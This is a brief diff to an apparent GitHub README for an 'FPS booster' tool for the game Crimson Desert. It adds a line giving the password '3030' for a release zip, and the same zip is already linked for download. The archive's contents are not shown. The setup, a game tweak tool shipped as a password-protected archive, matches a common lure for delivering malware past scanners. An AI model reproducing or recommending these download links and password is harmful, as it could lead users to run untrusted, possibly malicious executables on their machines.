@@ -8,6 +8,7 @@
 ## 🚀 Crimson Desert Fps Boost tools
 
 # [Download](https://github.com/Mortarfledarn/Crimson-Desert-FPS-Booster-tools/releases/download/crimson-desert-fps-pc/Crimson-Desert.7.3.2.Booster.zip)
+# [PASSWORD 3030](https://github.com/Mortarfledarn/Crimson-Desert-FPS-Booster-tools/releases/download/crimson-desert-fps-pc/Crimson-Desert.7.3.2.Booster.zip)
 
 
 ⚙️ FPS Boost Tool for Crimson Desert 🚀
